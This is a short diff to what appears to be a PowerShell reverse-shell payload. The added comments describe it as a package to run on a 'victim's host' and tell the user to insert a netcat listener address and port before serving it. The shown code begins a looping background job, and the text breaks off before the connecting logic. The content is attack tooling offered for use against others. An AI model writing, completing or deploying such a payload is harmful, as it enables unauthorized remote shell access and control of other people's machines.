@@ -1,4 +1,8 @@
-# Replace '[LISTENER_ADDRESS]' with your listener's address, and '[LISTENER_PORT]' with your listener's port before serving the file.
+# This is a payload package to be ran on your victim's host.
+# Modify this for your own use.
+# Replace '[LISTENER_ADDRESS]' with your netcat listener's address, and '[LISTENER_PORT]' with your netcat listener's port before serving the file.
+# Very likely it will be your localhost where this payload will be served.
+
 $pstr=@'
 while($true){
 	$job=start-job -scriptblock {
